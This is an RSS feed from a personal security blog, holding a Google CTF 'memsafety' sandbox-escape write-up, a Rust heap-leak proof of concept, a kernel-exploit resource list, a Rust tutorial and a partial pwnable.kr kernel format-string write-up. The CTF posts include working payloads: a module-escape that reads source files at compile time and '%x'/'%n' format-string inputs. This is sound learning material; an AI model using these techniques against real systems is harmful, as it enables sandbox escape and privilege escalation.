<?xml version="1.0" encoding="UTF-8"?> 
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ᛟYael</title>
    <description>Yael's Digital Grimoire</description>
    <link>https://anti.moe/~~yael</link>
    <atom:link href="https://anti.moe/~~yaelrss.xml" rel="self" type="application/rss+xml" />
    <item>
  <title>Google CTF 2021 - Memsaftey</title>
  <description>
    <![CDATA[
<p>Lately I&#8217;ve been quite busy with IRL stuff and most of my computer stuff has been dedicated to CTF&#8217;s - latest of which was Google CTF 2023. It was a great amount of fun and there are posts in the works about it already~</p>

<p>Although it made me reminscent of an older challange that was presented two years ago in Google CTF 2021: <code>memsafety</code></p>

<h2 id="background">Background</h2>

<p>Going back 2 years ago is quite wild, I was a bored high school barely surviving <em>the pandemic</em>. Back then I was much much less skilled, as it was one of my first ever CTF&#8217;s. Me and <a href="https://tzlil.net">my friend</a> competed and managed to complete around 2&#8211;3 challanges, honestly more than we anticipated and looking back at it was quite impressive &gt;&lt;</p>

<p>This is the story about the most memorable challange we solved.</p>

<h2 id="thechallange">The Challange</h2>

<p>After a small analysis it appears this challange contains three of my favorite things of all times: pwn, sandbox escape and Rust~!</p>

<p>Downloading the attachment archive linked on the website we get several files: a <code>sources/</code> Rust project directory and <code>chal.py</code> script:</p>

<pre><code>├── chal.py
└── sources
    ├── Cargo.lock
    ├── Cargo.toml
    ├── prelude
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    ├── proc-sandbox
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    ├── server
    │   ├── Cargo.toml
    │   └── src
    │       └── main.rs
    ├── user-0
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    └── user-1
        ├── Cargo.toml
        └── src
            └── lib.rs
</code></pre>

<h3 id="thesandbox">The sandbox</h3>

<p>Scary at first but after a deeper look it isn&#8217;t bad at all, let&#8217;s start unpacking the Rust project.
It seems to be a sandboxing service that pulls programs from <code>user-n/src/lib.rs</code> and runs them with sandbox constraints defined in <code>proc-sandbox/src/lib.rs</code>.</p>

<p>First we should understand what is the sandboxing mechanism. looking at the code it seems to be walking through the AST of our service and denying unsafe expressions, FFI calls, external crate declerations and denial of access to several critical functions and macros. it is being exported as a procedural macro that will later be used on our service functions. On top of that laters we&#8217;ll find that our services run in a non-std enviroment - oomf.</p>

<pre><code class="rust">use proc_macro::TokenStream;
use quote::ToTokens;
use syn::visit::Visit;
use syn::{parse_macro_input, ExprUnsafe, ForeignItem, Ident, Item, ItemExternCrate};

struct Sandbox;
const BLOCKLIST: &amp;[&amp;str] = &amp;[
    &quot;env&quot;,
    &quot;file&quot;,
    &quot;include&quot;,
    &quot;include_bytes&quot;,
    &quot;include_str&quot;,
    &quot;option_env&quot;,
    &quot;std&quot;,
];

impl&lt;'ast&gt; Visit&lt;'ast&gt; for Sandbox {
    ...
}
</code></pre>

<p>Seems to be pretty extensive, let&#8217;s put on our hacker hats and escape the sandbox~
The server module seems to be pulling services to sandbox from <code>user-0</code> and <code>user-1</code>. the first is a blank program where our code will be probably be stored and the latter reads the flag into the memory.</p>

<p>user&#8211;1/src/lib.rs</p>

<pre><code class="rust">#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    static FLAG: &amp;'static str = &quot;CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}&quot;;
    use prelude::{mem::ManuallyDrop, Service, Box, String};
    pub struct State(ManuallyDrop&lt;String&gt;);
    impl State {
        pub fn new() -&gt; Box&lt;dyn Service&gt; {
            Box::new(State(ManuallyDrop::new(String::from(FLAG))))
        }
    }
    impl Service for State {
       fn handle(&amp;mut self, _: &amp;str) {}
    }
}
</code></pre>

<p>The way the flag is allocated is incredibly weird though, it uses the <code>ManuallyDrop</code> trait - meaning the flag persists in memory after it gets out of scope (exits the function). This is a huge hint later down the line, perhaps we could leak values off the heap and leak the flag. Anyways, let&#8217;s continue~</p>

<p>In terms of the Rust program we&#8217;re almost done. One last look at how the services get executed:
Both services get first allocated and only then ran, meaning they&#8217;re all simoustanly in scope and present in memory as they run, this only strengthens the theory we had earlier.</p>

<p>server/src/main.rs</p>

<pre><code class="rust">use prelude::Service;
fn main() {
    let mut services: Vec&lt;Box&lt;dyn Service&gt;&gt; = vec![
        user_0::user::State::new(),
        user_1::user::State::new(),
    ];
    for service in &amp;mut services {
        service.handle(&quot;test query&quot;);
    }
}
</code></pre>

<h3 id="pythonscript">Python script</h3>

<p>After all of this we&#8217;re still left with mere <code>chal.py</code>, this seems to be the frontend program that is running for us to access.
It contains quite a lot of complications of it&#8217;s own so let&#8217;s take a deeper look~</p>

<p>The main routine can tell us a lot about each individual component of it:</p>

<pre><code class="py">def main():
    user_input = get_user_input()
    write_to_rs(user_input)
    build_challenge()

    # Check user input after building since the compilation in check_user_input() will
    # generate errors after generating the ast since the compilation command is
    # incomplete. Let the proper build run first so users can be presented with any
    # compilation issues, then validate it before we actually run.
    check_user_input()

    run_challenge()
</code></pre>

<p>It first takes our user input, writes it to our rust project (assumingly in <code>user-0/src/lib.rs</code>), builds it, checks the input and then runs the service if it&#8217;s valid.</p>

<p>Two important limitations the app presents is that our code gets written inside a sandboxed service (meaning all of the AST sandboxign applies), and there&#8217;s a check in the <code>check_user_input()</code> for module escaping:</p>

<pre><code class="py">        if len(ast[&quot;module&quot;][&quot;items&quot;]) != 5:
            socket_print(&quot;Module escaping detected, aborting.&quot;)
            sys.exit(1)
</code></pre>

<h2 id="ourunintentedsoltuion">Our Unintented Soltuion</h2>

<p>We were a tad overwhelmed at first although there was something that stuck out like a sore thumb to us, the control flow on the python on script. Why include AST checks in it when you have the rust sandboxing module, and why after you first build the program??? </p>

<p>Scouring through it we found our first vulnerability in the code present in <code>write_to_rs()</code>, it seems to just insert our code into the file without any brackets escpaing checks:</p>

<pre><code class="py">def write_to_rs(contents):
    socket_print(&quot;Writing source to disk...&quot;)
    rs_prelude = &quot;&quot;&quot;#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
    &quot;&quot;&quot;.splitlines()

    with open('/home/user/sources/user-0/src/lib.rs', 'w') as fd:
        fd.write('\n'.join(rs_prelude))
        fd.write('\n'.join(contents))
        fd.write(&quot;\n}\n&quot;)
</code></pre>

<p>this means we can write code that escapes the sandboxed rust module by satisfying the service traint, closing the mod with a bracket and creating our own with an unclosed bracket at the end (which will get appended by the script later)</p>

<pre><code class="rust">    // boilerplate code
    use prelude::{Box, Service};
    pub struct State;
    impl State {
        pub fn new() -&gt; Box&lt;dyn Service&gt; {
            Box::new(Self)
        }
    }
    impl Service for State {
       fn handle(&amp;mut self, _: &amp;str) {}
    }
} // close the sandboxed module

// define our own swag module
mod pwn {
    // non sandboxed code

// no curly bracket since it will get added
</code></pre>

<p>As we jumped out of our chairs in glee we referred to the script and understood why the python AST checks were in place, it catches our sneaky module escape since we add an additional module to the namespace.</p>

<p>This was a good start though; looking at the script again the lisp brainrot struck and we remembered something weird, our code gets built before the user checks - this means macros are executed and expanded at will. Combining these two vulnerabilities seems incredibly promising: we could escape out of the sandboxed module and build a macro that will get expanded without any limitations &lt;3</p>

<p>If you&#8217;re a Rust newbie and not sure how to write such macro, worry not as the blocklist will provide a list of relevant functions to leverage :D </p>

<p>Knowing that the flag resides as a static string in the <code>user-1</code> service, we can <code>include_str!</code> it and print it to us using compiler debug options. here&#8217;s our final payload &lt;3</p>

<pre><code class="rust">    // boilerplate code
    use prelude::{Box, Service};
    pub struct State;
    impl State {
        pub fn new() -&gt; Box&lt;dyn Service&gt; {
            Box::new(Self)
        }
    }
    impl Service for State {
       fn handle(&amp;mut self, _: &amp;str) {}
    }
} // close the sandboxed module

// define our own swag module
mod pwn {
    fn leet() {
        compile_error!(include_str!(&quot;home/user/sources/user-1/src/lib.rs&quot;));
    }
</code></pre>

<h2 id="theintentedsolution-revisitedayearlater">The Intented Solution - Revisited a Year Later</h2>

<p>Our first solution was exciting and worked perfectly for the timespan of the competition - It was obvious the intented solution was leaking the flag from memory, I felt unsatisfied with it and revisited it quite some time later (What about that <code>ManuallyDrop</code>!!!). This time let&#8217;s pwn this Rust program, for real.</p>

<p>The vulnerabilities we found last time are not sufficient here since we&#8217;re anticipating our program to actually get executed in run-time inside the sandbox. I don&#8217;t have much experience in exploiting Rust programs, but since the code doesn&#8217;t use any <code>unsafe</code> blocks it is reasonable to assume the code is <code>safe</code> in theory. IN PRACTICE THOUGH, I would imagine there&#8217;s some compiler bug that would allow us to leak memory somewhere, Rust is a young ambitious language that is being improved upon daily &lt;3</p>

<p>Rushing to check the Rust version it seems the application runs <code>rustc 1.47.0</code>, we can plug that into the Rust compiler repository and look for vulnerabilities to leverage. We need to first revisit our application layout a bit, the flag gets loaded into the heap section waiting to be dropped (which doesn&#8217;t happen till termination) - if we could leak the application&#8217;s heap we should be able to extract it from there~</p>

<p>Combining our established knowledge and the fact this specific version was chosen we can find <a href="https://github.com/rust-lang/rust/pull/80895">Issue #80895</a>. A bug present in the Rust compiler from version 1.20 to 1.50 that can leak the heap using malicious <code>Read</code> and <code>Drop</code> implementations. My understanding of it goes as follows:</p>

<p>We first defined our own &#8220;malicious&#8221; reader that implements the <code>Read</code> trait, in the end will read from the heap. it needs a function that takes mutable buffer and will return the length of bytes we read. The malicious Reader will have 2 states: on the first read it will return an arbrtirary number of bytes we would like to read from the heaps, and on the second one it will stop reading. This may appear weird at first but in conjuction with an uninitialized <code>Vec</code> it is the way to leak our flag :3</p>

<p>Now if we use our reader&#8217;s <code>read_to_end()</code> function on the unitnialized vector it will trick the compiler and change the vector&#8217;s buffer size. It is possible to access the vector after this method by implementing the <code>Drop</code> trait that will activate whenever it needs to be deallocated (which happens after it is deemed to be read and the malicious modification of it&#8217;s length), there the access to the heap is ours &gt;:3</p>

<p>Here&#8217;s a POC for it:</p>

<pre><code class="rust">#![forbid(unsafe_code)]

use std::io::Read;

struct PwnRead {
    first: bool,
}

impl PwnRead {
    pub fn new() -&gt; Self {
        PwnRead { first: false }
    }
}

impl Read for PwnRead {
    fn read(&amp;mut self, _buf: &amp;mut [u8]) -&gt; std::io::Result&lt;usize&gt; {
        if !self.first {
            self.first = true;
            // First state: return more than the buffer size
            Ok(200)
        } else {
            // Second state: we are done &gt;:3
            Ok(0)
        }
    }
}

struct VecHeapWrapper {
    inner: Vec&lt;u8&gt;,
}

impl VecHeapWrapper {
    pub fn new() -&gt; Self {
        VecHeapWrapper { inner: Vec::new() }
    }
}

impl Drop for VecHeapWrapper {
    fn drop(&amp;mut self) {
        // Leak heap !!!!
        // Buffer size has changed to whatever is dictated by the reader
        println!(&quot;{:?}&quot;, &amp;self.inner);
    }
}

fn main() {
    let mut vec = VecHeapWrapper::new();
    let mut read = PwnRead::new();
    read.read_to_end(&amp;mut vec.inner).unwrap();
}
</code></pre>

<p>This is by no means an exhaustive look on this bug or any Rust bugs in general, so please read more about it on the GitHub if it is of interest.</p>

<h2 id="conclusion">Conclusion</h2>

<p><strong>WOW</strong> what a challenge~</p>

<p>It is maybe not your average C Linux pwn, but it still taught me so much. I endlessly enjoyed the multiple deep ways you can solve it, only deepening my knowledge with each approach. The techniques used in both solutions are not straightforward at all, although they&#8217;re super fun and not too difficult to catch even under a timeconstraint.</p>

<p>Furthermore, I&#8217;m super psyched I chose to return to it and finish it &#8220;properly&#8221;. It taught me so much and only gave validation for the first approach we took.</p>

<p>I really hope you enjoyed reading as much as I enjoyed writing, thank you so much for reaching thus far~ &lt;3</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-memsafety.txt</guid>
  <link>gopher://localhost:7070/0.//article-memsafety.txt</link>
  <pubDate>Wed, 28 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>LOBFS - Library of Babel File System</title>
  <description>
    <![CDATA[
<p>Blog post coming soon~</p>

<p>Project can be found <a href="https://github.com/konata-chan404/LOBFS">here</a></p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-lobfs.txt</guid>
  <link>gopher://localhost:7070/0.//article-lobfs.txt</link>
  <pubDate>Sat, 17 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>Window Kernel Resources</title>
  <description>
    <![CDATA[
<p>Recently I&#8217;ve been putting all of my efforts into learning Window Internals and it&#8217;s kernel, this list is for personal archive purposes~
It&#8217;s ever growing &lt;3</p>

<p><a href="https://fuzzysecurity.com/tutorials.html">FuzzySecurity&#8217;s Internals series</a></p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSysExtremeVulenrableDriver</a></p>

<h1 id="tools">Tools</h1>

<p><a href="http://virtualkd.sysprogs.org/">VirtualKD</a></p>

<p><a href="https://www.osronline.com/article.cfm?article=157">OSR Driver Loader</a></p>

<h1 id="writeups">Writeups</h1>

<p><a href="https://h0mbre.github.io/RyzenMaster_CVE/">CVE&#8211;2020&#8211;12928 Exploit Proof-of-Concept</a></p>

<p><a href="https://connormcgarr.github.io/cve-2020-21551-sploit/">CVE&#8211;2021&#8211;21551 - Dell ‘dbutil_2_3.sys’</a></p>

<h1 id="vulenrabledrivers">Vulenrable Drivers</h1>

<p><a href="https://github.com/namazso/physmem_drivers">Physmem Drivers</a></p>

<p><a href="https://github.com/eclypsium/Screwed-Drivers/tree/master">Screwed Drivers</a></p>

<h1 id="bootkits">Bootkits</h1>

<p><a href="https://github.com/Mattiwatti/EfiGuard">EfiGuard</a></p>

<p><a href="https://github.com/memN0ps/bootkit-rs">bootkit-rs</a></p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-windowskernel.txt</guid>
  <link>gopher://localhost:7070/0.//article-windowskernel.txt</link>
  <pubDate>Thu, 15 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>New Website using cl-yag</title>
  <description>
    <![CDATA[
<p>I commonly fall for what i call &#8220;Website Envy&#8221; - looking at other&#8217;s awesome sites and wanting mine to be just like that. So here&#8217;s a post detailing exactly that!</p>

<h2 id="acyberspace">A Cyberspace</h2>

<p>Recently I&#8217;ve tapped into the gopherspace, geminiverse and the World Wide Web as well. So many fun, interesting and downrigh beautiful webpages.
I was always in favor of static generated websites, with no backend and little as of effort on the clientside and discovering a whole slew of pages pushing that agenda with great content has just opened my eyes.</p>

<h2 id="cl-yag">cl-yag</h2>

<p>My last website was built with <a href="https://jaspervdj.be/hakyll/">Hakyll</a>, a static site generator written and operating in Haskell. It&#8217;s a great piece of software that highlights the declartive nature of functionl programming and how to leverage it using real applications. In my adventures I came across <a href="https://dataswamp.org/~solene/">Solene&#8217;s site</a>, a great hub of general computing, OpenBSD and NixOS. It&#8217;s design was minimal and elegant, yet robust enough to host plenty of content.</p>

<p>I decided to take her project <code>cl-yag</code> and use it for my own site - after a bit of lisp hacks it is now complete. You&#8217;re probably reading on it right now as well (Apologies reader futures after the inevitable changes).</p>

<h2 id="gophergemini">Gopher &amp; Gemini</h2>

<p>These protocols were first class requirements for my new website, although as of right now I don&#8217;t have a gopher or a gemini server running there&#8217;s full support for it. I can&#8217;t wait to join y&#8217;all in a bit~</p>

<h2 id="thoughts">Thoughts</h2>

<p>The modern web has consumed and taken from us so much, but I&#8217;m so happy there&#8217;s a niche for this still. I absolutely adore this kind of stuff and I&#8217;m glad I could add my website to this niche in the cyberspace.</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-cl-yag.txt</guid>
  <link>gopher://localhost:7070/0.//article-cl-yag.txt</link>
  <pubDate>Sat, 10 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>Why I love Rust: Pattern Matching</title>
  <description>
    <![CDATA[
<p>My journey with Rust has been rocky to say the least, from fandom to hating back to loving it, I never stopped learning about how I program and engineer. I&#8217;m a huge nerd of Functional Programming and the thing that absolutely sold me about rust is it&#8217;s algebric type system, it is my biggest joy to bring type proofness and complexity to low level programs. The pattern matching in it makes for expressive, readable and type-safe code. In this blog article we will take a look at this topic, and I hope you can learn something from it :3</p>

<h2 id="patterns">Patterns</h2>

<h3 id="refutablevsirrefutable">Refutable vs irrefutable</h3>

<p>Patterns in Rust come in two types; refutable and irrefutable. Patterns that match conditionally are called refutable, while patterns that match any possible value are called irrefutable. Which one you can use will depend on the context. For example, a let-statement will need a irrefutable pattern, because what would happen if a variable in a let-statement doesn’t get a value?</p>

<pre><code class="rust">// Irrefutable patterns - variable bindings, always succeeds
let x = 5;
let (x, y) = (1, 2);

// Doesn't compile
let Ok(x) = string.parse::&lt;i32&gt;() // parsing a string will return a Result&lt;T&gt;, and it is refutable whether it's an OK(x)
</code></pre>

<p>if let statements on the other hand can have refutable patterns, as the body is evaulated conditionally and it&#8217;s refutability is inherent:</p>

<pre><code class="rust">if let Ok(x) = string.parse::&lt;i32&gt;() {
  // ... do something if string can be parsed as a 32 bit integer ...
}

// if let can have a refutable pattern, so we can also use a value for x:
if let Ok(64) = someString.parse::&lt;i32&gt;() {
  // ... do something if string can be parsed as a 32 bit integer ...
}
</code></pre>

<h2 id="destructuring">Destructuring</h2>

<p>Many patterns destructure various types, and they can also be mixed and match together. Let’s look at some of them together~</p>

<h3 id="tuples">Tuples</h3>

<p>You are already probably familiar with tuple destructuring, but let&#8217;s examine again:</p>

<pre><code class="rust">// tuple: (i32, i32, &amp;str)
let tuple = (1, 2, &quot;three&quot;);
let (x, y, z_str) = tuple;
</code></pre>

<p>We see in the last line that tuple is destructured into 3 new variables: x, y, and z_str.
This can be done for all sorts of tuples, as long as the destructured types match.</p>

<p>My favorite trick is that you can match elements with <code>..</code> or <code>_</code>, which are used to skip elements and create more complex logic:</p>

<pre><code class="rust">// discard z_str
let (x, y, _) = tuple;

// get only x
let (x, ..) = tuple;

let big_tuple = (1, 2, 3, 4, 5);

// Does not compile, ambigious pattern.
let (..., middle, ...) = big_tuple;
</code></pre>

<p>(Patterns have to be unambigious)</p>

<h3 id="structs">Structs</h3>

<p>Structs are not much different than tuples, i&#8217;ll save your internet bandwidth by not showing an example although it is very self explanatory. The only difference is the .. behaviour, when deconstructing it has to come last and it means to match the rest and ignore the result.</p>

<h3 id="enums">Enums</h3>

<p>This might be the simplest yet most important of them all, the simplest case for enum deconstructing is to match one with no data:</p>

<pre><code class="rust">// simple enum
enum TrafficSignal {
    Red,
    Orange,
    Green
}

// match if our color is green
if let Color::green = my_color {
    // cars go!
}
</code></pre>

<p>Luckily, Rust enums are way way more interesting as they contain data. So much complexity arises out of that.</p>

<pre><code class="rust">// complex enum
enum Enemy {
    Alive(u32),
    Dead
}

// match against an alive enemy
if let Enemy::Alive(data) = my_enemy {
    // oh no! gotta beat them &gt;:3
}

// match against a dead enemy
if let Enemy::Dead = my_enemy {
    // you win~!
}
</code></pre>

<h2 id="otherpatterns">Other Patterns</h2>

<p>There are other types of patterns in Rust that capture a lot of elementary and cool behaviour. Since they&#8217;re varied it is best to just demonstrate them:</p>

<pre><code class="rust">// OR pattern

1 | 2 | 3 // matches 1, 2, or 3
&quot;one&quot; | &quot;two&quot; // matches one of these two strings

// range pattern

1..=10 // matches 1 to 10 (inclusive)
1..10 // matches 1 to 10 (non-inclusive)

// at pattern
struct Point {
    x: i32,
    y: i32
}

// matches if my_x exists under an optional condition
if let Point {x: my_x @ 1..=10, ..} = my_data {
    // my_x is between 1 and 10.
}
</code></pre>

<h2 id="thepayoff">The Payoff</h2>

<p>pattern matching is closely related to Rust&#8217;s powerful algebric type system. We can combine the different behaviours of patterns in order to write clear and simply awesome code~!<br>
One example that speaks to itself and shows the immense power pattern matching has is to pit it against object-oriented code. let&#8217;s consider a case where we have a Shape hierarchy with two concrete classes (Circle and Rectangle), we&#8217;ll compare the object-oriented approach in java with the pattern matching code in Rust.</p>

<h3 id="javaoop:">Java (OOP):</h3>

<pre><code class="java">abstract class Shape {
    abstract double calculateArea();
}

class Circle extends Shape {
    private double radius;

    public Circle(double radius) {
        this.radius = radius;
    }

    public double calculateArea() {
        return Math.PI * radius * radius;
    }
}

class Rectangle extends Shape {
    private double width;
    private double height;

    public Rectangle(double width, double height) {
        this.width = width;
        this.height = height;
    }

    public double calculateArea() {
        return width * height;
    }
}

public class Main {
    public static void main(String[] args) {
        Shape shape = new Circle(5.0);

        if (shape instanceof Circle) {
            Circle circle = (Circle) shape;
            double area = circle.calculateArea();
            System.out.println(&quot;Area of Circle: &quot; + area);
        } else if (shape instanceof Rectangle) {
            Rectangle rectangle = (Rectangle) shape;
            double area = rectangle.calculateArea();
            System.out.println(&quot;Area of Rectangle: &quot; + area);
        }
    }
}
</code></pre>

<h3 id="rustpatternmatching:">Rust (Pattern Matching):</h3>

<pre><code class="rust">enum Shape {
    Circle(f64),
    Rectangle(f64, f64),
}

fn calculate_area(shape: Shape) -&gt; f64 {
    match shape {
        Shape::Circle(radius) =&gt; std::f64::consts::PI * radius * radius,
        Shape::Rectangle(width, height) =&gt; width * height,
    }
}

fn main() {
    let circle = Shape::Circle(5.0);
    let circleArea = calculate_area(circle);
    let rectangle = Shape::Rectangle(5.0, 2.0);
    let rectangleArea = calculate_area(rectangle);
    
    println!(&quot;Area of Circle: {circleArea}&quot;, circleArea);
    println!(&quot;Area of Rectangle: {rectangleArea}&quot;, rectangleArea);
}
</code></pre>

<h3 id="conclusions">Conclusions</h3>

<p>I could go on about it for much longer, although I hope that was enough for the knowledge-hungry.
I hope you now understand pattern matching a little better and see how it is a fundamental and powerful feature in Rust that contributes to its overall expressiveness and safety. Embracing it in my code greatly enchanced my programming exprience and generally leads to more robust and maintanable applications.</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-rustpatterns.txt</guid>
  <link>gopher://localhost:7070/0.//article-rustpatterns.txt</link>
  <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>pwnable.kr's softmmu - An Awesome Linux Kernel Exploit</title>
  <description>
    <![CDATA[
<p>Over the years of my CTF&#8217;ing I always come back to <a href="https://pwnable.kr">pwnable.kr</a>, although a tad outdated it&#8217;s a vast source of simply awesome binary exploitation and pwn challanges. In particular their kernel exploitation series of challanges interest me - they&#8217;re really well made and good introductory material on the matter. Per the policies on the site, this writeup won&#8217;t share any source code and try to be minimal as possible.</p>

<p>The last of those challanges is <em>softmmu</em>, here&#8217;s the readme:</p>

<blockquote>
<p><strong><em>If you are good at kernel exploit, try this one :)</em></strong></p>
</blockquote>

<p><img src="./static/img/softmmu/softmmu.png" style="width:20%"></p>

<h2 id="thechallange">The Challange</h2>

<p>We&#8217;re given two things: a linux kernel object file containing some sort of a driver, and access to a fairly old linux virtual machine loaded with asid driver. Before we open the executable for further inspection in IDA, let&#8217;s SSH into the machine and check what it does.</p>

<pre><code class="shell">...
[+] Loading x86 PAE MMU emulator
[+] Write the virtual address to /proc/softmmu
[+] You can obtain it's physical address by reading /proc/softmmu
[+] i.e. echo -ne 'x00x80x04x08' &gt; /proc/softmmu; hexdump -C /proc/softmmu
[+] Let the kernel exploit begin :)

$ uname -a
Linux (none) 3.7.1 #1 SMP Mon Dec 23 06:07:19 PST 2013 i686 GNU/Linux
$ ls /*.ko
/softmmu.ko
</code></pre>

<p><em>Hmm</em>, it prints out a pretty explanation for us :3 As the name softmmu hints - the module interfaces with the Linux kernel memory&#8217;s and emulates a x86 Page Address Extension for the MMU. The interface with the module seems to be very straightforward, we write a virtual address to the device file /proc/softmmu and then read back the physical address.</p>

<h2 id="findingavulnerability">Finding A Vulnerability</h2>

<p>Our end goal is to get root, so we definitely have to find a vulnerability to expoloit in the softmmu module. Let&#8217;s open the kernel object file in IDA to analyze:</p>

<p><img src="./static/img/softmmu/overview.png" style="width:70%"></p>

<p>A fairly tame program, not too many functions and fairly straightforward structure. We are not going to reverse the entire program (since I found the vulnerability quickly) but here are some pointers:</p>

<blockquote>
<p>We cannot request the physical addresses of ones outside userspace (seems important for the exploit).
It recursively traverses page table within the mmu_walk() function in order to retrieve addresses.
Program contains verbose output for debugging purposes.</p>
</blockquote>

<p>The last point is particulary important; it allows us to understand the inner workings better and perhaps find a vulnerability to exploit, let&#8217;s look at the debugging code.</p>

<pre><code class="c">__int64 __usercall get_pte_entry@&lt;edx:eax&gt;(int a1@&lt;eax&gt;, char *a2@&lt;edx&gt;)
{
  int v2; // ebx

  v2 = *(_DWORD *)&amp;a2[8 * ((a1 &amp; 0x1FF000u) &gt;&gt; 12)];
  if ( (v2 &amp; 1) != 0 )
  {
    printk(&quot;[Debug] PGD(%x) Dumpn&quot;, a2);
    printk(
      &quot;[task:%s] %p:%02x %p:%02x %p:%02x %p:%02xn&quot;,
      (const char *)(__readfsdword((unsigned int)&amp;current_task) + 740),
      a2,
      *a2,
      a2 + 1,
      a2[1],
      a2 + 2,
      a2[2],
      a2 + 3,
      a2[3]);
    printk(&quot;[Debug] Dump Virtual Addressn&quot;);
    printk(&quot;n===============================n&quot;);
    printk((const char *)req_vaddr);
    printk(&quot;n===============================n&quot;);
  }
  return v2;
}
</code></pre>

<p>Fairly bloaty raw decompiled code, but breaking it down it is very simple: it retrieves a page table entry from a PD64 (Page Global Directory entry). Besides the pretty cool kernel level code, the vulnerability here is glaringly obvious - the program passes the address we request (a global variable) to printk().</p>

<blockquote>
<p>printk((const char *)req_vaddr);</p>
</blockquote>

<h4 id="boom">Boom~!</h4>

<p>We found a string format vulnerability we can control :3 </p>

<h2 id="writingtheexploit-pt.1">Writing The Exploit - Pt. 1</h2>

<p>So far this hasn&#8217;t been a challenge for kernel experts, even a script kiddie can find this vulnerability. I must admit, writing the exploit is much more difficult because a plethora of reasons.</p>

<p>In order to pass a string to the module, we&#8217;d have to allocate some bytes in the process memory space. Let&#8217;s try compile a simple C program on the remote machine to do just that:</p>

<pre><code class="shell">/tmp $ gcc pwn.c
sh: gcc: not found
</code></pre>

<p><em>Oof</em>, that means we have to cross compile.
The first problem that imposes us is the fact the remote machine is running a really outdated version of the kernel, paired with the fact it doesn&#8217;t have internet access it really limits us in how we compile for it.
The soltuion that I came up with was as follows
compile a static no-stdlib program -&gt; compress it -&gt; base64 the tar.gz -&gt; do the reverse on remote.</p>

<h4 id="thismeanswritingaminimallibcfromscratchgoodluckme...">This means writing a minimal libc from scratch, <em>good luck me</em>&#8230;</h4>

<p>After a fair amount of work, I got to a level where I had all of the necessary API&#8217;s to leverage the vulnerability
On local machine:</p>

<pre><code class="shell">yael@covenstead:~/softmmu$ gcc pwn.c -nostdlib -m32 -static -o /dev/stdout | gzip - | base64 -w 0
H4sIAAAAAAAAA+1bfWwT5xlz3YSjziNYdmW0nR1p2iE0phAUpY0k0gCB2kFw4RYa9dS49hHEsd2PPtcEgYrzIuI5VnLgE2a1j+Q9v2hqdpUpPHPsqZt...
</code></pre>

<p>On Remote:</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%x %x %x %xn&quot;
&lt; paste base64 code here &gt;
[ 1406.371600] virtual address set to dede000
[ 1406.371963] [Debug] PGD(c2ad1000) Dump
[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.372963] [Debyg] Dump Virtual Address
[ 1406.373234]
[ 1406.373234] =============================
[ 1406.373627] c2eb7514 c2ad21000 0 c2ad21001 0
======================================
[ 1406.374963] [Debug] PGD(c2ad1000) Dump
[ 1406.374520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.374963] [Debyg] Dump Virtual Address
[ 1406.375234]
[ 1406.375234] =============================
[ 1406.375627] c2eb7514 c2ad21000 0 c2ad21001 0
======================================
[&lt;3] softmmu output: 0xBFB81288
</code></pre>

<p>Awesome~! We&#8217;re able to leak addresses off the stack :3
Finally some progress, we should try running the forsakened %n&#8230;</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%65n&quot;
&lt; ... &gt;
[ 1406.371600] virtual address set to dede000
[ 1406.371963] [Debug] PGD(c2ad1000) Dump
[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.372963] [Debyg] Dump Virtual Address
[ 1406.373234]
[ 1406.373234] =============================
[ 1406.373627]                                                               
======================================
[ 1406.374963] [Debug] PGD(c2ad1000) Dump
[ 1406.374520] [task:A] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.374963] [Debyg] Dump Virtual Address
[ 1406.375234]
[ 1406.375234] =============================
[ 1406.375627]                                                        
======================================
[&lt;3] softmmu output: 0xBFB81288
</code></pre>

<p>OMG, it worked and we wrote into the process name &lt;3! (As seen in the debug messages) All of this work wasn&#8217;t for nothing.</p>

<h2 id="writingtheexploit-pt.2">Writing The Exploit - Pt. 2</h2>

<p>Now for the second part of the exploit, we have to figure out how the hell we take advantage of the format string vulnerability. This isn&#8217;t like the average format string attack as it&#8217;s not performed on a userland stack, but a kernel one. Besides our request address which occasionally surfaces down the stack we get nada.</p>

<p>Luckily for us we have a bunch of debug values on the stack, some of them might be incredibly useful to craft an exploit. <strong><em>Yes!</em></strong> The stack is setup in a way we can write to the page table entry any arbtriary value we want, hence we change the permissions of a kernel pages and execute our code as supervisor :3
(We have a pointer for each byte and the corresponding address)</p>

<p>Since we have to fully comperhend the paging mechanism in full detail to execute this exploit properly, here&#8217;s a diagram of the Page Table Entry structure:</p>

<p><img src="./static/img/softmmu/pte.png" style="width:70%"></p>

